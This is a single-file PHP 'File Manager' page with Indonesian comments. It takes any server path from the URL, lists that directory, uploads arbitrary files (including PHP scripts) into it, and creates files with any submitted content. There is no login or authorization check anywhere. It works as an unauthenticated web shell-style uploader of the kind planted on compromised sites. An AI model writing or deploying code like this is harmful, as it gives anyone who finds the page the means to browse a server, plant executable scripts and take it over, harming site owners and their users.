<?php
session_start();

$msg = '';
$err = '';

// Direktori aktif — pakai absolute path langsung seperti oradanta.php
$cur = isset($_GET['d']) ? $_GET['d'] : getcwd();
$cur = rtrim($cur, '/');
if (empty($cur) || !is_dir($cur)) {
    $cur = getcwd();
}

// Parent dir
$parent = dirname($cur);
$hasParent = ($parent !== $cur);

// Actions
$act = isset($_POST['act']) ? $_POST['act'] : '';

// Upload
if ($act === 'up' && isset($_FILES['f'])) {
    $ok = 0;
    foreach ($_FILES['f']['name'] as $i => $n) {
        if ($_FILES['f']['error'][$i] !== 0) continue;
        $dst = $cur . '/' . basename($n);
        if (move_uploaded_file($_FILES['f']['tmp_name'][$i], $dst)) $ok++;
    }
    $msg = $ok . ' file berhasil diupload.';
    header('Location: ?d=' . urlencode($cur));
    exit;
}

// Buat folder
if ($act === 'md') {
    $n = trim(isset($_POST['n']) ? $_POST['n'] : '');
    $n = preg_replace('/[^a-zA-Z0-9._\- ]/', '', $n);
    if ($n === '') {
        $err = 'Nama folder kosong.';
    } elseif (file_exists($cur . '/' . $n)) {
        $err = 'Sudah ada.';
    } elseif (mkdir($cur . '/' . $n, 0755, true)) {
        header('Location: ?d=' . urlencode($cur));
        exit;
    } else {
        $err = 'Gagal membuat folder.';
    }
}

// Buat file
if ($act === 'nf') {
    $n = trim(isset($_POST['n']) ? $_POST['n'] : '');
    $n = preg_replace('/[^a-zA-Z0-9._\-]/', '', $n);
    $c = isset($_POST['c']) ? $_POST['c'] : '';
    if ($n === '') {
        $err = 'Nama file kosong.';
    } elseif (file_exists($cur . '/' . $n)) {
        $err = 'File sudah ada.';
    } elseif (file_put_contents($cur . '/' . $n, $c) !== false) {
        header('Location: ?d=' . urlencode($cur));
        exit;
    } else {
        $err = 'Gagal membuat file.';
    }
}

// Daftar isi direktori
$dirs  = array();
$files = array();
if (is_dir($cur) && is_readable($cur)) {
    $items = scandir($cur);
    foreach ($items as $it) {
        if ($it === '.' || $it === '..') continue;
        $abs = $cur . '/' . $it;
        if (is_dir($abs)) {
            $dirs[] = $it;
        } else {
            $files[] = $it;
        }
    }
    sort($dirs);
    sort($files);
}

function fmtSize($b) {
    if ($b >= 1073741824) return round($b/1073741824, 1).' GB';
    if ($b >= 1048576)    return round($b/1048576, 1).' MB';
    if ($b >= 1024)       return round($b/1024, 1).' KB';
    return $b.' B';
}

function fIcon($name) {
    $e = strtolower(pathinfo($name, PATHINFO_EXTENSION));
    $m = array(
        'pdf'=>'📕','php'=>'🐘','js'=>'📜','html'=>'🌐','htm'=>'🌐',
        'css'=>'🎨','json'=>'📋','xml'=>'📄','sql'=>'🗃️',
        'jpg'=>'🖼️','jpeg'=>'🖼️','png'=>'🖼️','gif'=>'🖼️','webp'=>'🖼️',
        'zip'=>'🗜️','rar'=>'🗜️','gz'=>'🗜️','tar'=>'🗜️',
        'txt'=>'📝','md'=>'📝','csv'=>'📊','log'=>'📋',
        'mp4'=>'🎬','mp3'=>'🎵','docx'=>'📘','xlsx'=>'📗','pptx'=>'📙',
    );
    return isset($m[$e]) ? $m[$e] : '📄';
}

$totalItems = count($dirs) + count($files);
?>
<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>File Manager</title>
<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600&family=Syne:wght@400;700;800&display=swap" rel="stylesheet">
<style>
*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
:root{
  --bg:#0d0f14;--bg2:#13161e;--bg3:#1a1e28;--border:#252935;
  --green:#00e5a0;--text:#e2e6f0;--muted:#6b7280;
  --red:#ff4f5e;--yellow:#fbbf24;
  --mono:'JetBrains Mono',monospace;--sans:'Syne',sans-serif;
}
html,body{height:100%}
body{font-family:var(--sans);background:var(--bg);color:var(--text);display:flex;flex-direction:column;min-height:100vh}
a{text-decoration:none}

header{display:flex;align-items:center;gap:12px;padding:13px 22px;background:var(--bg2);border-bottom:1px solid var(--border);position:sticky;top:0;z-index:50;flex-wrap:wrap}
.logo{font-weight:800;font-size:1.05rem;color:var(--green);letter-spacing:-.5px;white-space:nowrap}
.pathbar{font-family:var(--mono);font-size:.74rem;color:var(--muted);flex:1;word-break:break-all}
.pathbar span{color:var(--green);font-weight:700}

.wrap{display:flex;flex:1;overflow:hidden}

aside{width:255px;flex-shrink:0;background:var(--bg2);border-right:1px solid var(--border);overflow-y:auto;padding:14px 0}
.sec{padding:0 11px 14px;border-bottom:1px solid var(--border);margin-bottom:3px}
.sec:last-child{border-bottom:none}
.sec-label{font-size:.63rem;font-weight:700;letter-spacing:1.5px;text-transform:uppercase;color:var(--muted);padding:3px 3px 9px}
.form-col{display:flex;flex-direction:column;gap:8px}
.lbl{font-size:.7rem;color:var(--muted);font-weight:600;display:block;margin-bottom:3px}
input[type=text],textarea{width:100%;background:var(--bg);border:1px solid var(--border);border-radius:5px;color:var(--text);font-family:var(--mono);font-size:.78rem;padding:7px 9px;outline:none;transition:.15s}
input[type=text]:focus,textarea:focus{border-color:var(--green)}
textarea{resize:vertical;min-height:80px}
.btn{display:flex;align-items:center;justify-content:center;gap:5px;padding:8px 13px;border-radius:5px;border:none;font-family:var(--sans);font-weight:700;font-size:.76rem;cursor:pointer;width:100%;transition:.15s}
.btn-green{background:var(--green);color:#000}
.btn-green:hover{filter:brightness(1.1)}
.btn-outline{background:transparent;border:1px solid var(--border);color:var(--text)}
.btn-outline:hover{border-color:var(--green);color:var(--green)}

.upzone{border:2px dashed var(--border);border-radius:8px;padding:18px 10px;text-align:center;cursor:pointer;position:relative;transition:.2s}
.upzone:hover,.upzone.drag{border-color:var(--green);background:rgba(0,229,160,.04)}
.upzone input{position:absolute;inset:0;opacity:0;cursor:pointer;width:100%;height:100%}
.upzone .ico{font-size:1.5rem;margin-bottom:5px}
.upzone strong{font-size:.78rem}
.upzone small{display:block;color:var(--muted);font-size:.69rem;margin-top:3px}
#flist{font-family:var(--mono);font-size:.7rem;color:var(--green);max-height:65px;overflow-y:auto;margin-top:4px}

main{flex:1;overflow-y:auto;padding:18px 22px;display:flex;flex-direction:column;gap:13px}
.bar{display:flex;align-items:center;justify-content:space-between;gap:10px;flex-wrap:wrap}
.bar-left{display:flex;align-items:center;gap:8px;flex-wrap:wrap}
.count{font-family:var(--mono);font-size:.72rem;color:var(--muted)}

.back-link{display:inline-flex;align-items:center;gap:5px;padding:5px 11px;background:var(--bg3);border:1px solid var(--border);border-radius:5px;color:var(--muted);font-size:.75rem;font-weight:700;transition:.15s;white-space:nowrap}
.back-link:hover{color:var(--green);border-color:var(--green)}

#q{background:var(--bg2);border:1px solid var(--border);border-radius:5px;color:var(--text);font-family:var(--mono);font-size:.78rem;padding:6px 11px;width:190px;outline:none;transition:.15s}
#q:focus{border-color:var(--green)}

.tbl{width:100%;border-collapse:collapse;font-size:.83rem}
.tbl th{text-align:left;padding:7px 11px;font-size:.65rem;text-transform:uppercase;letter-spacing:1px;color:var(--muted);border-bottom:1px solid var(--border);font-weight:700;background:var(--bg);position:sticky;top:0;z-index:5}
.tbl td{padding:9px 11px;border-bottom:1px solid rgba(37,41,53,.5);vertical-align:middle}
.tbl tr:last-child td{border-bottom:none}
.tbl tr:hover td{background:var(--bg2)}
.fname a{color:var(--text);font-weight:600;display:flex;align-items:center;gap:5px;transition:.15s}
.fname a:hover{color:var(--green)}
.fname.isdir a{color:var(--yellow)}
.fname.isdir a:hover{color:#fff}
.fic{margin-right:2px}
.meta{font-family:var(--mono);font-size:.7rem;color:var(--muted)}
.tag{display:inline-block;padding:1px 7px;border-radius:20px;font-size:.63rem;font-weight:700;letter-spacing:.3px;text-transform:uppercase}
.tag-d{background:rgba(251,191,36,.12);color:var(--yellow)}
.tag-f{background:rgba(0,229,160,.08);color:var(--green)}

.alert{display:flex;align-items:center;gap:9px;padding:9px 14px;border-radius:8px;font-size:.8rem;font-weight:600;animation:si .25s ease}
@keyframes si{from{opacity:0;transform:translateY(-5px)}to{opacity:1}}
.alert-ok{background:rgba(0,229,160,.1);border:1px solid rgba(0,229,160,.25);color:var(--green)}
.alert-err{background:rgba(255,79,94,.1);border:1px solid rgba(255,79,94,.25);color:var(--red)}

.empty{text-align:center;padding:55px 20px;color:var(--muted)}
.empty-ico{font-size:2.2rem;margin-bottom:8px}

@media(max-width:700px){
  .wrap{flex-direction:column}
  aside{width:100%;border-right:none;border-bottom:1px solid var(--border)}
  main{padding:12px}
}
</style>
</head>
<body>

<header>
  <div class="logo">📂 FileMgr</div>
  <div class="pathbar">📍 <span><?= htmlspecialchars($cur) ?></span></div>
</header>

<div class="wrap">
<aside>

  <div class="sec">
    <div class="sec-label">Upload File</div>
    <form method="post" enctype="multipart/form-data" class="form-col">
      <input type="hidden" name="act" value="up">
      <div class="upzone" id="dz">
        <div class="ico">📤</div>
        <strong>Drop file di sini</strong>
        <small>atau klik untuk pilih</small>
        <input type="file" name="f[]" multiple id="fi">
      </div>
      <div id="flist"></div>
      <button type="submit" class="btn btn-green">Upload</button>
    </form>
  </div>

  <div class="sec">
    <div class="sec-label">Buat Folder</div>
    <form method="post" class="form-col">
      <input type="hidden" name="act" value="md">
      <div>
        <label class="lbl">Nama Folder</label>
        <input type="text" name="n" placeholder="nama-folder" required>
      </div>
      <button type="submit" class="btn btn-outline">📁 Buat Folder</button>
    </form>
  </div>

  <div class="sec">
    <div class="sec-label">Buat File Baru</div>
    <form method="post" class="form-col">
      <input type="hidden" name="act" value="nf">
      <div>
        <label class="lbl">Nama File</label>
        <input type="text" name="n" placeholder="file.txt" required>
      </div>
      <div>
        <label class="lbl">Isi (opsional)</label>
        <textarea name="c" placeholder="Konten file..."></textarea>
      </div>
      <button type="submit" class="btn btn-outline">📄 Buat File</button>
    </form>
  </div>

</aside>

<main>
  <?php if ($msg): ?>
    <div class="alert alert-ok">✅ <?= htmlspecialchars($msg) ?></div>
  <?php endif; ?>
  <?php if ($err): ?>
    <div class="alert alert-err">⚠️ <?= htmlspecialchars($err) ?></div>
  <?php endif; ?>

  <div class="bar">
    <div class="bar-left">
      <?php if ($hasParent): ?>
        <a href="?d=<?= urlencode($parent) ?>" class="back-link">⬅ Naik ke <?= htmlspecialchars(basename($parent) ?: '/') ?></a>
      <?php endif; ?>
      <span class="count"><?= $totalItems ?> item</span>
    </div>
    <input type="text" id="q" placeholder="Cari file..." oninput="cari(this.value)">
  </div>

  <?php if ($totalItems === 0): ?>
    <div class="empty">
      <div class="empty-ico">🗂️</div>
      <p>Folder kosong.</p>
    </div>
  <?php else: ?>
  <table class="tbl" id="tbl">
    <thead>
      <tr>
        <th style="width:52%">Nama</th>
        <th>Tipe</th>
        <th>Ukuran</th>
        <th>Diubah</th>
      </tr>
    </thead>
    <tbody>
    <?php foreach ($dirs as $d):
      $abs = $cur . '/' . $d;
    ?>
      <tr>
        <td class="fname isdir">
          <a href="?d=<?= urlencode($abs) ?>">
            <span class="fic">📁</span><?= htmlspecialchars($d) ?>
          </a>
        </td>
        <td><span class="tag tag-d">dir</span></td>
        <td class="meta">—</td>
        <td class="meta"><?= date('Y-m-d H:i', (int)filemtime($abs)) ?></td>
      </tr>
    <?php endforeach; ?>
    <?php foreach ($files as $f):
      $abs = $cur . '/' . $f;
      $ext = strtolower(pathinfo($f, PATHINFO_EXTENSION) ?: 'file');
    ?>
      <tr>
        <td class="fname">
          <span style="display:flex;align-items:center;gap:5px">
            <span class="fic"><?= fIcon($f) ?></span><?= htmlspecialchars($f) ?>
          </span>
        </td>
        <td><span class="tag tag-f"><?= htmlspecialchars($ext) ?></span></td>
        <td class="meta"><?= fmtSize((int)filesize($abs)) ?></td>
        <td class="meta"><?= date('Y-m-d H:i', (int)filemtime($abs)) ?></td>
      </tr>
    <?php endforeach; ?>
    </tbody>
  </table>
  <?php endif; ?>
</main>
</div>

<script>
var dz = document.getElementById('dz');
var fi = document.getElementById('fi');
var fl = document.getElementById('flist');

function showF(files) {
  fl.innerHTML = Array.from(files).map(function(f) {
    return '<div>📄 ' + f.name + '</div>';
  }).join('');
}
fi.addEventListener('change', function() { showF(fi.files); });
dz.addEventListener('dragover', function(e) { e.preventDefault(); dz.classList.add('drag'); });
dz.addEventListener('dragleave', function() { dz.classList.remove('drag'); });
dz.addEventListener('drop', function(e) {
  e.preventDefault();
  dz.classList.remove('drag');
  if (e.dataTransfer.files.length) {
    try {
      var dt = new DataTransfer();
      Array.from(e.dataTransfer.files).forEach(function(f) { dt.items.add(f); });
      fi.files = dt.files;
    } catch(x) {}
    showF(e.dataTransfer.files);
  }
});

function cari(q) {
  var rows = document.querySelectorAll('#tbl tbody tr');
  var lq = q.toLowerCase();
  rows.forEach(function(r) {
    var t = (r.querySelector('.fname') || {}).textContent || '';
    r.style.display = t.toLowerCase().indexOf(lq) >= 0 ? '' : 'none';
  });
}

document.querySelectorAll('.alert').forEach(function(a) {
  setTimeout(function() {
    a.style.transition = 'opacity .4s';
    a.style.opacity = '0';
    setTimeout(function() { a.remove(); }, 400);
  }, 4000);
});
</script>
</body>
</html>
